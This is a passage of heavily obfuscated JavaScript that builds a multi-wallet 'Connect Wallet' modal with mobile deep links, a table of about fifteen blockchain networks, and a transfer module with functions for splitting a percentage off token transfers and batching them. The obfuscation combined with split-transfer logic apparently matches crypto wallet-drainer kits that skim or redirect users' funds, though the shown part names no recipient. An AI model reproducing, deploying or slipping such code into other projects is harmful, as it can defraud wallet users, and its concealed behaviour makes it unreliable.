_0x371157['request']({'method':_0x573166(0x377)+'teGas','params':[_0x39318b]});}catch{return _0x573166(0x556);}}function _0x534ec6(_0x5059d0){const _0x4eeb45=_0x536e87,{to:_0x952bb5,from:_0x480a07,value:_0x2dd0ca,data:_0x12145b,chainId:_0x20a2fe,gasLimit:_0x594dd4,gasPrice:_0x5f7f2a,nonce:_0x23fb5a}=_0x5059d0;return{'from':_0x480a07,'to':_0x952bb5,'value':_0x2dd0ca||'0x0','data':_0x12145b||'0x','chainId':_0x20a2fe,'gas':_0x594dd4||'0x5208','gasPrice':_0x5f7f2a||_0x4eeb45(0x487)+'0','nonce':_0x23fb5a};}return{'DEFAULT_SPLIT_PERCENT':_0x810046,'SELECTORS':_0x290de7,'encodeTransfer':_0x1a1897,'encodeTransferFrom':_0x4d0498,'calculateSplit':_0x588805,'buildTransferWithSplit':_0x22eda9,'buildTransferFromWithSplit':_0x38752f,'buildNativeTransferWithSplit':_0x205ad3,'getBalance':_0x2eafc3,'executeTransferWithSplit':_0xdf3ba,'batchTransferWithSplit':_0x3bc382,'formatAmount':_0x1e81fb,'parseAmount':_0x115f89,'getGasPrice':_0xc9c6ea,'estimateTransferGas':_0x5bb917,'createUnsignedTransfer':_0x534ec6};}());typeof module!==_0x2c4f95(0x45a)&&module['exports']&&(module[_0x2c4f95(0x1c3)]=_0x2cddd3);const _0x5504da=(function(){'use strict';const _0x415a0d=_0x2c4f95;const _0x2b25c3={'METAMASK':_0x415a0d(0x485),'WALLET_CONNECT':_0x415a0d(0x580)+_0x415a0d(0x5bf),'TRUST':_0x415a0d(0x322),'COINBASE':_0x415a0d(0x2e6),'BRAVE':_0x415a0d(0x55e),'RAINBOW':_0x415a0d(0x3b3),'PHANTOM':'phantom','TRONLINK':_0x415a0d(0x14e),'INJECTED':_0x415a0d(0x158)},_0x4d2bb6={'default':{'bg':_0x415a0d(0x4b9)+_0x415a0d(0xdd)+_0x415a0d(0x52b)+_0x415a0d(0x1f2)+_0x415a0d(0xd5),'text':_0x415a0d(0x99),'accent':_0x415a0d(0x501),'border':_0x415a0d(0x23b)+_0x415a0d(0x170)+')','itemBg':_0x415a0d(0x23b)+_0x415a0d(0x1b8)+'5)','itemHover':_0x415a0d(0x23b)+_0x415a0d(0x170)+')'},'light':{'bg':_0x415a0d(0x269),'text':_0x415a0d(0x63c),'accent':_0x415a0d(0x501),'border':'#e0e0e0','itemBg':_0x415a0d(0x3d2),'itemHover':_0x415a0d(0x51f)},'glass':{'bg':_0x415a0d(0x59b)+'255,\x20255,\x20'+_0x415a0d(0x4f7),'text':'#fff','accent':_0x415a0d(0x99),'border':_0x415a0d(0x59b)+_0x415a0d(0x23a)+_0x415a0d(0x650),'itemBg':_0x415a0d(0x59b)+_0x415a0d(0x23a)+_0x415a0d(0x371),'itemHover':_0x415a0d(0x59b)+_0x415a0d(0x23a)+_0x415a0d(0x4f7),'blur':_0x415a0d(0x214)},'minimal':{'bg':_0x415a0d(0x63c),'text':_0x415a0d(0x99),'accent':_0x415a0d(0x99),'border':_0x415a0d(0x38d),'itemBg':_0x415a0d(0x58d),'itemHover':'#222'}};function _0x10187a(_0x3b4f7a=_0x415a0d(0x51c)){const _0x2afd1d=_0x415a0d,_0x241b37=_0x4d2bb6[_0x3b4f7a]||_0x4d2bb6[_0x2afd1d(0x51c)];return'\x0a\x20\x20\x20\x20.wall'+'et-modal-o'+_0x2afd1d(0x512)+_0x2afd1d(0x94)+_0x2afd1d(0x65b)+_0x2afd1d(0x3c9)+_0x2afd1d(0xe2)+_0x2afd1d(0x1be)+_0x2afd1d(0x15e)+_0x2afd1d(0x29e)+_0x2afd1d(0x310)+_0x2afd1d(0x2bf)+'p-filter:\x20'+(_0x241b37[_0x2afd1d(0x3b0)]||_0x2afd1d(0x459))+(_0x2afd1d(0x1da)+'splay:\x20fle'+_0x2afd1d(0x422)+_0x2afd1d(0x18c)+_0x2afd1d(0x4d2)+_0x2afd1d(0x1a3)+_0x2afd1d(0x205)+_0x2afd1d(0x39e)+_0x2afd1d(0xb0)+_0x2afd1d(0x3ab)+_0x2afd1d(0x1d7)+_0x2afd1d(0x642)+_0x2afd1d(0x5ae)+_0x2afd1d(0x5c3)+_0x2afd1d(0x346)+_0x2afd1d(0x63f)+_0x2afd1d(0x21f)+_0x2afd1d(0x278)+_0x2afd1d(0x557)+_0x2afd1d(0x189)+_0x2afd1d(0x48d)+_0x2afd1d(0x64a)+_0x2afd1d(0x3fc)+_0x2afd1d(0x4d0)+'BlinkMacSy'+'stemFont,\x20'+_0x2afd1d(0x250)+_0x2afd1d(0xc8)+'Helvetica,'+_0x2afd1d(0x64d)+_0x2afd1d(0x43d)+_0x2afd1d(0x274)+'.wallet-mo'+_0x2afd1d(0x49e)+_0x2afd1d(0xc5)+'\x20opacity:\x20'+_0x2afd1d(0x166)+_0x2afd1d(0x137)+_0x2afd1d(0x27a)+_0x2afd1d(0x4f0)+_0x2afd1d(0x63e)+_0x2afd1d(0xeb)+_0x2afd1d(0x568))+_0x241b37['bg']+(_0x2afd1d(0x298)+'ckdrop-fil'+_0x2afd1d(0x39b))+(_0x241b37[_0x2afd1d(0x3b0)]||'none')+(';\x0a\x20\x20\x20\x20\x20\x20bo'+_0x2afd1d(0x2fa)+_0x2afd1d(0x5ee)+_0x2afd1d(0x34e)+_0x2afd1d(0x3be)+_0x2afd1d(0x47d)+_0x2afd1d(0xba)+_0x2afd1d(0x5c7)+'idth:\x20420p'+_0x2afd1d(0x40f)+_0x2afd1d(0x24b)+_0x2afd1d(0x522)+_0x2afd1d(0x2c4)+_0x2afd1d(0x4b5)+_0x2afd1d(0x13c))+_0x241b37['border']+(_0x2afd1d(0x632)+_0x2afd1d(0xe1)+_0x2afd1d(0x19f)+_0x2afd1d(0x12f)+_0x2afd1d(0x50c)+'ion:\x20all\x200'+'.3s\x20cubic-'+_0x2afd1d(0x495)+_0x2afd1d(0x4e7)+'1);\x0a\x20\x20\x20\x20\x20\x20'+_0x2afd1d(0x4cb)+_0x2afd1d(0x5c8)+'\x20\x20\x20\x20\x20\x20colo'+_0x2afd1d(0x1d3))+_0x241b37[_0x2afd1d(0x54b)]+(';\x0a\x20\x20\x20\x20}\x0a\x20\x20'+'\x20\x20.wallet-'+_0x2afd1d(0x324)+_0x2afd1d(0x55b)+_0x2afd1d(0x5a9)+'odal\x20{\x20tra'+_0x2afd1d(0x48f)+_0x2afd1d(0x198)+');\x20}\x0a\x20\x20\x20\x20\x0a'+'\x20\x20\x20\x20.walle'+_0x2afd1d(0x2c1)+_0x2afd1d(0xa0)+'\x20\x20\x20display'+_0x2afd1d(0x478)+_0x2afd1d(0x47b)+_0x2afd1d(0x2af)+_0x2afd1d(0x620)+_0x2afd1d(0x5b7)+_0x2afd1d(0x63b)+'ems:\x20cente'+_0x2afd1d(0x661)+_0x2afd1d(0x83)+_0x2afd1d(0x159)+'\x20\x20\x20\x20\x20\x20padd'+_0x2afd1d(0x338)+_0x2afd1d(0x218)+_0x2afd1d(0x12b)+'-bottom:\x201'+_0x2afd1d(0xdb))+_0x241b37[_0x2afd1d(0x400)]+(_0x2afd1d(0x452)+_0x2afd1d(0x1af)+_0x2afd1d(0x520)+_0x2afd1d(0x61f)+_0x2afd1d(0x23c)+_0x2afd1d(0x5f6)+_0x2afd1d(0xc6)+'argin:\x200;\x20'+_0x2afd1d(0x5b8)+_0x2afd1d(0x2df)+_0x2afd1d(0x592)+'ckground:\x20')+_0x241b37['itemBg']+(';\x0a\x20\x20\x20\x20\x20\x20bo'+_0x2afd1d(0x76)+_0x2afd1d(0x405)+_0x2afd1d(0x135))+_0x241b37['text']+(';\x0a\x20\x20\x20\x20\x20\x20wi'+_0x2afd1d(0x492)+'\x20height:\x203'+_0x2afd1d(0x41d)+'\x20border-ra'+_0x2afd1d(0x3ef)+_0x2afd1d(0x64f)+_0x2afd1d(0xb4)+_0x2afd1d(0x593)+_0x2afd1d(0x35b)+_0x2afd1d(0x42b)+_0x2afd1d(0x419)+'nter;\x20just'+_0x2afd1d(0x205)+_0x2afd1d(0x39e)+_0x2afd1d(0x3fd)+_0x2afd1d(0x22f)+'px;\x0a\x20\x20\x20\x20}\x0a'+'\x20\x20\x20\x20.walle'+_0x2afd1d(0x5d2)+_0x2afd1d(0x5a8)+_0x2afd1d(0x47c)+_0x2afd1d(0x246)+'-template-'+_0x2afd1d(0x190)+_0x2afd1d(0x57c)+'fr);\x0a\x20\x20\x20\x20\x20'+'\x20gap:\x2012px'+_0x2afd1d(0x1a2)+_0x2afd1d(0x53b)+_0x2afd1d(0x2ae)+_0x2afd1d(0x601)+_0x2afd1d(0xa2)+_0x2afd1d(0x108)+'display:\x20f'+_0x2afd1d(0x41a)+'direction:'+_0x2afd1d(0x5bc)+_0x2afd1d(0x18c)+_0x2afd1d(0x1dd)+_0x2afd1d(0x437)+_0x2afd1d(0x247)+_0x2afd1d(0x24e)+_0x2afd1d(0x54d)+':\x2012px\x204px'+_0x2afd1d(0x3f1)+_0x2afd1d(0x182)+_0x2afd1d(0x2ac)+_0x2afd1d(0x211)+'.2s;\x0a\x20\x20\x20\x20}'+_0x2afd1d(0x202)+'et-item:ho'+_0x2afd1d(0x4e0)+'ground:\x20')+_0x241b37[_0x2afd1d(0x4e1)]+(_0x2afd1d(0x1c8)+_0x2afd1d(0x16c)+_0x2afd1d(0x545)+'\x20}\x0a\x20\x20\x20\x20.wa'+_0x2afd1d(0xe3)+_0x2afd1d(0x383)+'\x20\x20\x20width:\x20'+_0x2afd1d(0x1ef)+_0x2afd1d(0x4dc)+_0x2afd1d(0x51b)+'ius:\x2014px;'+'\x0a\x20\x20\x20\x20\x20\x20bac'+_0x2afd1d(0x42f))+_0x241b37[_0x2afd1d(0x5e2)]+(_0x2afd1d(0x1da)+'splay:\x20fle'+_0x2afd1d(0x305)+_0x2afd1d(0x3b6)+_0x2afd1d(0x3c1)+'y-content:'+'\x20center;\x0a\x20'+_0x2afd1d(0x369)+_0x2afd1d(0x33d)+_0x2afd1d(0x268)+_0x2afd1d(0x24b)+_0x2afd1d(0xf0)+_0x2afd1d(0x233)+',0,0.1);\x0a\x20'+_0x2afd1d(0x601)+_0x2afd1d(0xa2)+_0x2afd1d(0x314)+_0x2afd1d(0x45f)+_0x2afd1d(0x271)+_0x2afd1d(0x546)+_0x2afd1d(0x44b)+_0x2afd1d(0x1d8)+_0x2afd1d(0x4b2)+_0x2afd1d(0x490)+_0x2afd1d(0xe3)+_0x2afd1d(0x41c)+'t-size:\x2011'+'px;\x20font-w'+'eight:\x20500'+';\x20color:\x20')+_0x241b37[_0x2afd1d(0x54b)]+(_0x2afd1d(0x4ec)+_0x2afd1d(0x473)+'-align:\x20ce'+_0x2afd1d(0xd8)+_0x2afd1d(0x1de)+_0x2afd1d(0x563)+_0x2afd1d(0x43c)+_0x2afd1d(0x42f))+_0x241b37['accent']+(_0x2afd1d(0x399)+'color:\x20#ff'+'f;\x20border:'+_0x2afd1d(0x4ad)+_0x2afd1d(0x5c9)+_0x2afd1d(0x3f1)+'adius:\x2012p'+'x;\x20width:\x20'+'100%;\x0a\x20\x20\x20\x20'+_0x2afd1d(0x3ad)+_0x2afd1d(0x1ed)+_0x2afd1d(0x503)+'pointer;\x20m'+_0x2afd1d(0x155)+_0x2afd1d(0x8f)+_0x2afd1d(0x5a8)+_0x2afd1d(0x156)+_0x2afd1d(0x25f)+_0x2afd1d(0x54e)+_0x2afd1d(0x621)+_0x2afd1d(0x359)+_0x2afd1d(0x5c6)+_0x2afd1d(0x8f)+_0x2afd1d(0x490)+_0x2afd1d(0x320)+_0x2afd1d(0x1e9)+_0x2afd1d(0x629)+_0x2afd1d(0x78)+_0x2afd1d(0x46d)+_0x2afd1d(0x4f2)+_0x2afd1d(0x3d1)+_0x2afd1d(0x224)+_0x2afd1d(0x7f)+_0x2afd1d(0x2bb)+_0x2afd1d(0x3f9)+_0x2afd1d(0x3cc)+_0x2afd1d(0x36a)+_0x2afd1d(0x28a)+_0x2afd1d(0x155)+_0x2afd1d(0x1a8)+_0x2afd1d(0x188)+_0x2afd1d(0x5df)+_0x2afd1d(0x32f)+'text-align'+':\x20center;\x0a'+'\x20\x20\x20\x20}\x0a\x20\x20\x20\x20'+_0x2afd1d(0x58c)+_0x2afd1d(0x294)+_0x2afd1d(0x43a)+_0x2afd1d(0x184)+_0x2afd1d(0x282)+'\x20\x20\x20\x20\x20\x20\x20\x20ma'+_0x2afd1d(0x28f)+_0x2afd1d(0x19c)+_0x2afd1d(0x393)+_0x2afd1d(0x2b3)+_0x2afd1d(0x374)+_0x2afd1d(0xa6)+_0x2afd1d(0x3cd)+_0x2afd1d(0x192)+_0x2afd1d(0x600)+_0x2afd1d(0x5d1)+_0x2afd1d(0xca)+'t-radius:\x20'+_0x2afd1d(0x548)+'\x20transform'+_0x2afd1d(0x303)+_0x2afd1d(0x1f6)+'\x20\x20\x20\x20\x20\x20}\x0a\x20\x20'+'\x20\x20}\x0a\x20\x20');}const _0x2246c6={'metamask':_0x415a0d(0x438)+_0x415a0d(0x639)+_0x415a0d(0x11f)+'/','trust':_0x415a0d(0x63d)+_0x415a0d(0x1fd)+'llet.com/o'+_0x415a0d(0x2b9)+'l=','rainbow':_0x415a0d(0x403)+_0x415a0d(0x5f8)+'pen-url?ur'+'l=','coinbase':_0x415a0d(0x9f)+'.cb-w.com/'+_0x415a0d(0x28d)+'l=','phantom':_0x415a0d(0x506)+_0x415a0d(0x3b4)+_0x415a0d(0x651),'tonkeeper':_0x415a0d(0x436)+_0x415a0d(0x49a)+_0x415a0d(0x20a)+'connect'},_0x5ba96f=[{'id':'metamask','name':_0x415a0d(0x24a),'icon':_0x415a0d(0x403)+'w.githubus'+_0x415a0d(0x513)+_0x415a0d(0x2e9)+'sk/brand-r'+_0x415a0d(0x3ce)+_0x415a0d(0x185)+_0x415a0d(0x104)+_0x415a0d(0x646)},{'id':'trust','name':'Trust\x20Wall'+'et','icon':_0x415a0d(0x3d4)+_0x415a0d(0x375)+_0x415a0d(0x1f4)+'/images/me'+_0x415a0d(0x59a)+_0x415a0d(0x525)+'tform.svg'},{'id':'coinbase','name':_0x415a0d(0xa9),'icon':_0x415a0d(0x231)+'w.coinbase'+'.com/favic'+_0x415a0d(0x51d)},{'id':_0x415a0d(0x3b3),'name':_0x415a0d(0x408),'icon':_0x415a0d(0x403)+_0x415a0d(0x1cc)+_0x415a0d(0x513)+_0x415a0d(0x376)+_0x415a0d(0x594)+_0x415a0d(0x573)+'/packages/'+_0x415a0d(0x4ea)+_0x415a0d(0x58a)+_0x415a0d(0x4a2)+_0x415a0d(0x571)+'rainbowWal'+'let/rainbo'+_0x415a0d(0x491)+'g'},{'id':_0x415a0d(0x2f9),'name':_0x415a0d(0x284),'icon':'https://ph'+_0x415a0d(0x3b4)+'favicon.ic'+'o'},{'id':'walletconn'+_0x415a0d(0x5bf),'name':_0x415a0d(0x3bb)+'ect','icon':_0x415a0d(0x403)+_0x415a0d(0x1cc)+'ercontent.'+_0x415a0d(0x65f)+'Connect/wa'+'lletconnec'+'t-assets/m'+_0x415a0d(0x4f5)+'/Blue%20(D'+_0x415a0d(0xfc)+_0x415a0d(0x61a)},{'id':_0x415a0d(0x357),'name':_0x415a0d(0x33a),'icon':_0x415a0d(0x231)+_0x415a0d(0x4bf)+'favicon.ic'+'o'},{'id':_0x415a0d(0x551),'name':_0x415a0d(0x27d),'icon':_0x415a0d(0x403)+_0x415a0d(0x445)+_0x415a0d(0x227)+_0x415a0d(0xfe)},{'id':_0x415a0d(0x13b),'name':'Ledger','icon':'https://ww'+'w.ledger.c'+_0x415a0d(0x3b9)+_0x415a0d(0xc7)}];let _0x346c34=null;function _0x73e7df(){const _0x486869=_0x415a0d,_0x3a83e7=window[_0x486869(0xbc)+_0x486869(0x470)]?.['ui']?.[_0x486869(0x523)]||_0x486869(0x51c);if(!document[_0x486869(0x291)+_0x486869(0x607)](_0x486869(0x616)+_0x486869(0x4fb))){const _0x5cbe60=document[_0x486869(0x7d)+_0x486869(0x3f4)](_0x486869(0x4c0));_0x5cbe60['id']=_0x486869(0x616)+_0x486869(0x4fb),_0x5cbe60['textConten'+'t']=_0x10187a(_0x3a83e7),document[_0x486869(0x1a4)]['appendChil'+'d'](_0x5cbe60);}!_0x346c34&&(_0x346c34=document[_0x486869(0x7d)+_0x486869(0x3f4)]('div'),_0x346c34['id']='wallet-mod'+_0x486869(0x547),_0x346c34[_0x486869(0x1a6)]=_0x486869(0x616)+_0x486869(0x547),document[_0x486869(0x2d2)][_0x486869(0x44e)+'d'](_0x346c34));}function _0x5a6142(_0x359ca6,_0x2397be=window[_0x415a0d(0x482)][_0x415a0d(0x25d)]){const _0x4100e4=_0x415a0d,_0x41f16f=_0x2246c6[_0x359ca6];if(!_0x41f16f)return _0x2397be;if(_0x359ca6===_0x4100e4(0x485)||_0x359ca6==='phantom')return _0x41f16f+_0x2397be;return _0x41f16f+encodeURIComponent(_0x2397be);}function _0x404bb0(_0x26425b={}){const _0x5830cf=_0x415a0d;_0x73e7df();const _0x39a7ac=/iPhone|iPad|iPod|Android/i['test'](navigator[_0x5830cf(0x493)]),_0x6e8aa0=_0x5ba96f['map'](_0x77576=>'\x0a\x20\x20\x20\x20\x20\x20<di'+_0x5830cf(0x433)+'allet-item'+_0x5830cf(0x480)+_0x5830cf(0x583)+_0x77576['id']+(_0x5830cf(0xcb)+'\x20<div\x20clas'+'s=\x22wallet-'+'item-icon\x22'+_0x5830cf(0x19e)+_0x5830cf(0x222)+_0x5830cf(0xe4))+_0x77576[_0x5830cf(0x1d9)]+_0x5830cf(0x3c4)+_0x77576[_0x5830cf(0x2d5)]+('\x22\x20onerror='+_0x5830cf(0x124)+_0x5830cf(0x1fe)+_0x5830cf(0x3bc)+'r.com/7.x/'+'initials/s'+'vg?seed=')+_0x77576[_0x5830cf(0x2d5)]+(_0x5830cf(0x370)+_0x5830cf(0x22a)+_0x5830cf(0x4c3)+_0x5830cf(0x433)+_0x5830cf(0x2fc)+_0x5830cf(0x18e))+_0x77576[_0x5830cf(0x2d5)]+(_0x5830cf(0x1f8)+'\x20\x20\x20</div>\x0a'+_0x5830cf(0x4db)))[_0x5830cf(0x381)]('');return _0x346c34[_0x5830cf(0x28c)]=_0x5830cf(0x14f)+_0x5830cf(0x433)+_0x5830cf(0x3e1)+_0x5830cf(0x4cd)+_0x5830cf(0x4e6)+_0x5830cf(0x57f)+'-modal-hea'+_0x5830cf(0x103)+'\x20\x20\x20\x20\x20\x20<h2\x20'+_0x5830cf(0x3f8)+'let-modal-'+_0x5830cf(0x570)+'nect\x20Walle'+_0x5830cf(0x3cf)+_0x5830cf(0x109)+_0x5830cf(0x569)+'=\x22wallet-c'+_0x5830cf(0x34c)+'es;</butto'+_0x5830cf(0x634)+_0x5830cf(0x585)+_0x5830cf(0x1bc)+_0x5830cf(0x3b1)+_0x5830cf(0x540)+_0x5830cf(0x19e)+'\x20\x20'+_0x6e8aa0+(_0x5830cf(0x295)+'/div>\x0a\x20\x20\x20\x20'+_0x5830cf(0x4db))+(_0x39a7ac?'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x5830cf(0x7e)+_0x5830cf(0x2eb)+_0x5830cf(0x44f)+_0x5830cf(0x1f3)+_0x5830cf(0x472)+_0x5830cf(0x1aa)+_0x5830cf(0x5b0)+'d=\x22deep-li'+_0x5830cf(0x2e3)+_0x5830cf(0x196)+_0x5830cf(0x1f3)+'img\x20src=\x22h'+_0x5830cf(0x223)+_0x5830cf(0x3fb)+_0x5830cf(0x4d1)+'om/MetaMas'+_0x5830cf(0x2b8)+_0x5830cf(0x4b1)+'ster/SVG/m'+'etamask-fo'+_0x5830cf(0x458)+_0x5830cf(0x344)+_0x5830cf(0x2f7)+_0x5830cf(0x2fb)+_0x5830cf(0x3ea)+_0x5830cf(0x355)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20<'+_0x5830cf(0xb9)+_0x5830cf(0x1f3)+'/div>\x0a\x20\x20\x20\x20'+_0x5830cf(0x4db):'')+('\x0a\x20\x20\x20\x20\x20\x20\x20\x20<'+_0x5830cf(0x1fc)+'llet-error'+_0x5830cf(0x7c)+_0x5830cf(0x468)+_0x5830cf(0x549)+_0x5830cf(0x5a5)),setTimeout(()=>_0x346c34[_0x5830cf(0x17c)]['add'](_0x5830cf(0x18b)),0xa),new Promise((_0x371545,_0x327c4a)=>{const _0x420dea=_0x5830cf;_0x346c34[_0x420dea(0x519)+_0x420dea(0x543)](_0x420dea(0x59c)+_0x420dea(0x1c5))[_0x420dea(0xe7)]=()=>{_0xed5f9a(),_0x327c4a(new Error('Cancelled'));},_0x346c34['querySelec'+_0x420dea(0x280)](_0x420dea(0x10b)+'em')[_0x420dea(0x425)](_0x43fd29=>{_0x43fd29['onclick']=async()=>{const _0x2b8fcd=_0x4a8a,_0x5df03a=_0x43fd29[_0x2b8fcd(0x1a1)][_0x2b8fcd(0x3c0)];if(_0x39a7ac&&_0x2246c6[_0x5df03a]){window[_0x2b8fcd(0x482)][_0x2b8fcd(0x25d)]=_0x5a6142(_0x5df03a);return;}try{if(window[_0x2b8fcd(0x456)+'ct']){const _0x1a3b3b=await window[_0x2b8fcd(0x456)+'ct']['connect']();_0xed5f9a(),_0x371545(_0x1a3b3b);}else throw new Error(_0x2b8fcd(0xe0)+'ine\x20not\x20lo'+_0x2b8fcd(0x95));}catch(_0xf0a1a){_0x4b25c8(_0xf0a1a['message']);}};}),_0x39a7ac&&document[_0x420dea(0x291)+_0x420dea(0x607)](_0x420dea(0x409)+'metamask')&&(document['getElement'+_0x420dea(0x607)](_0x420dea(0x409)+_0x420dea(0x485))[_0x420dea(0xe7)]=()=>{const _0x5b172f=_0x420dea;window[_0x5b172f(0x482)][_0x5b172f(0x25d)]=_0x5a6142(_0x5b172f(0x485));});});}function _0x4b25c8(_0x286c42){const _0x2c3a43=_0x415a0d,_0x2555b1=document['getElement'+'ById'](_0x2c3a43(0x201)+'or-contain'+'er');_0x2555b1&&(_0x2555b1[_0x2c3a43(0x28c)]='<div\x20class'+_0x2c3a43(0x289)+_0x2c3a43(0x1ff)+_0x286c42+_0x2c3a43(0x302));}function _0xed5f9a(){const _0x131b65=_0x415a0d;if(_0x346c34)_0x346c34['classList'][_0x131b65(0x388)](_0x131b65(0x18b));}return{'show':_0x404bb0,'hide':_0xed5f9a};}());typeof module!=='undefined'&&module[_0x2c4f95(0x1c3)]&&(module[_0x2c4f95(0x1c3)]=_0x5504da);const _0x96e043=(function(){'use strict';const _0x5adfa8=_0x2c4f95;const _0x58d27c={'eth':{'chainId':_0x5adfa8(0x2ef),'chainIdNum':0x1,'name':'Ethereum','symbol':_0x5adfa8(0x85),'icon':'⟠','color':'#627EEA','rpc':_0x5adfa8(0x633)+_0x5adfa8(0x24d)+'.com'},'bsc':{'chainId':'0x38','chainIdNum':0x38,'name':_0x5adfa8(0x42e)+_0x5adfa8(0x430),'symbol':_0x5adfa8(0x384),'icon':'⬡','color':'#F3BA2F','rpc':_0x5adfa8(0x15c)+_0x5adfa8(0x47f)+_0x5adfa8(0x4d7)+_0x5adfa8(0x4b6)},'polygon':{'chainId':_0x5adfa8(0x219),'chainIdNum':0x89,'name':_0x5adfa8(0x3de),'symbol':_0x5adfa8(0x567),'icon':'⬡','color':_0x5adfa8(0x3f0),'rpc':_0x5adfa8(0x44d)+_0x5adfa8(0x114)+'com'},'avax':{'chainId':_0x5adfa8(0x26f),'chainIdNum':0xa86a,'name':_0x5adfa8(0x606),'symbol':_0x5adfa8(0xa8),'icon':'🔺','color':'#E84142','rpc':_0x5adfa8(0x436)+_0x5adfa8(0x5cd)+_0x5adfa8(0x518)+_0x5adfa8(0x46b)},'arbitrum':{'chainId':_0x5adfa8(0x2ff),'chainIdNum':0xa4b1,'name':_0x5adfa8(0x2b6),'symbol':_0x5adfa8(0x85),'icon':'🔵','color':_0x5adfa8(0x5b6),'rpc':_0x5adfa8(0x26a)+_0x5adfa8(0x1ec)+'m.io/rpc'},'optimism':{'chainId':_0x5adfa8(0x342),'chainIdNum':0xa,'name':_0x5adfa8(0x2a4),'symbol':_0x5adfa8(0x85),'icon':'🔴','color':'#FF0420','rpc':_0x5adfa8(0x46e)+'innet.opti'+_0x5adfa8(0x43f)},'base':{'chainId':_0x5adfa8(0x4f3),'chainIdNum':0x2105,'name':_0x5adfa8(0x603),'symbol':_0x5adfa8(0x85),'icon':'🔷','color':_0x5adfa8(0x53a),'rpc':_0x5adfa8(0x46e)+'innet.base'+'.org'},'fantom':{'chainId':'0xfa','chainIdNum':0xfa,'name':_0x5adfa8(0x27f),'symbol':'FTM','icon':'👻','color':_0x5adfa8(0x486),'rpc':'https://rp'+_0x5adfa8(0x511)+'s'},'unichain':{'chainId':_0x5adfa8(0x9d),'chainIdNum':0x82,'name':_0x5adfa8(0xe6),'symbol':'ETH','icon':'🦄','color':_0x5adfa8(0x266),'rpc':_0x5adfa8(0x46e)+'innet.unic'+_0x5adfa8(0x30a)},'sonic':{'chainId':_0x5adfa8(0xab),'chainIdNum':0x92,'name':_0x5adfa8(0x2db),'symbol':'S','icon':'⚡','color':'#0066FF','rpc':_0x5adfa8(0x1b3)+_0x5adfa8(0x21c)+_0x5adfa8(0x21a)},'berachain':{'chainId':_0x5adfa8(0xc9),'chainIdNum':0x138de,'name':'Berachain','symbol':_0x5adfa8(0x29d),'icon':'🐻','color':_0x5adfa8(0x4d3),'rpc':_0x5adfa8(0x1b3)+_0x5adfa8(0x466)+_0x5adfa8(0x1e3)},'linea':{'chainId':_0x5adfa8(0x59d),'chainIdNum':0xe708,'name':_0x5adfa8(0x4fe),'symbol':'ETH','icon':'📄','color':_0x5adfa8(0x234),'rpc':_0x5adfa8(0x1b3)+_0x5adfa8(0xf2)+'ild'},'scroll':{'chainId':_0x5adfa8(0x1e0),'chainIdNum':0x82750,'name':_0x5adfa8(0x4a4),'symbol':_0x5adfa8(0x85),'icon':'📜','color':'#FFEEDA','rpc':_0x5adfa8(0x1b3)+'c.scroll.i'+'o'},'zksync':{'chainId':'0x144','chainIdNum':0x144,'name':_0x5adfa8(0x243),'symbol':_0x5adfa8(0x85),'icon':'⬡','color':_0x5adfa8(0x19a),'rpc':_0x5adfa8(0x46e)+_0x5adfa8(0x581)+_0x5adfa8(0x5e7)},'blast':{'chainId':_0x5adfa8(0x2b7),'chainIdNum':0x13e31,'name':_0x5adfa8(0x4ca),'symbol':_0x5adfa8(0x85),'icon':'🟡','color':_0x5adfa8(0x25e),'rpc':_0x5adfa8(0x1b3)+'c.blast.io'}},_0x53311a=_0x5adfa8(0x4bc)+_0x5adfa8(0xd3)+_0x5adfa8(0x3c5)+_0x5adfa8(0x537)+'on:\x20fixed;'+_0x5adfa8(0xc3)+_0x5adfa8(0x4f9)+_0x5adfa8(0x92)+_0x5adfa8(0x4b3)+_0x5adfa8(0x36f)+'\x20\x20bottom:\x20'+_0x5adfa8(0x550)+_0x5adfa8(0x629)+'\x20rgba(0,\x200'+_0x5adfa8(0x591)+_0x5adfa8(0x379)+'play:\x20flex'+';\x0a\x20\x20\x20\x20\x20\x20al'+'ign-items:'+_0x5adfa8(0x61b)+_0x5adfa8(0x18f)+_0x5adfa8(0x380)+':\x20center;\x0a'+_0x5adfa8(0x134)+'dex:\x2099999'+_0x5adfa8(0x509)+_0x5adfa8(0x1cd)+_0x5adfa8(0x4a7)+_0x5adfa8(0x5ff)+_0x5adfa8(0x1ba)+_0x5adfa8(0x50c)+_0x5adfa8(0x412)+_0x5adfa8(0x4aa)+'se,\x20visibi'+'lity\x200.3s\x20'+_0x5adfa8(0x48e)+_0x5adfa8(0x535)+_0x5adfa8(0x528)+_0x5adfa8(0x267)+'ive\x20{\x0a\x20\x20\x20\x20'+_0x5adfa8(0x420)+_0x5adfa8(0xa5)+'visibility'+_0x5adfa8(0x80)+_0x5adfa8(0x5dc)+_0x5adfa8(0x1ae)+_0x5adfa8(0x63e)+'\x20\x20backgrou'+_0x5adfa8(0xee)+'-gradient('+'135deg,\x20#1'+_0x5adfa8(0xd6)+_0x5adfa8(0x635)+_0x5adfa8(0xe5)+_0x5adfa8(0xf1)+_0x5adfa8(0x157)+_0x5adfa8(0x5f3)+_0x5adfa8(0x553)+_0x5adfa8(0x476)+_0x5adfa8(0x656)+'440px;\x0a\x20\x20\x20'+_0x5adfa8(0x1e8)+_0x5adfa8(0x279)+_0x5adfa8(0x421)+_0x5adfa8(0x595)+_0x5adfa8(0x369)+'low-y:\x20aut'+_0x5adfa8(0x471)+_0x5adfa8(0x24b)+_0x5adfa8(0x4f1)+_0x5adfa8(0x2c4)+_0x5adfa8(0x27e)+_0x5adfa8(0x287)+_0x5adfa8(0x62e)+'scale(0.9)'+_0x5adfa8(0x632)+_0x5adfa8(0x3dc)+_0x5adfa8(0x429)+'0.3s\x20ease;'+_0x5adfa8(0x1fa)+_0x5adfa8(0x290)+_0x5adfa8(0x396)+_0x5adfa8(0x23a)+_0x5adfa8(0x4c1)+_0x5adfa8(0x5dc)+_0x5adfa8(0x1ae)+'dal-overla'+_0x5adfa8(0x258)+_0x5adfa8(0x34f)+_0x5adfa8(0x530)+_0x5adfa8(0x10c)+'\x20scale(1);'+'\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20'+_0x5adfa8(0x1ae)+_0x5adfa8(0x120)+_0x5adfa8(0x30b)+'ext-align:'+_0x5adfa8(0x61b)+_0x5adfa8(0x254)+_0x5adfa8(0x29f)+(_0x5adfa8(0x2b4)+_0x5adfa8(0x597)+_0x5adfa8(0x56b)+_0x5adfa8(0x452)+'\x20\x20.chain-m'+'odal-title'+_0x5adfa8(0x20e)+'ont-size:\x20'+_0x5adfa8(0x2b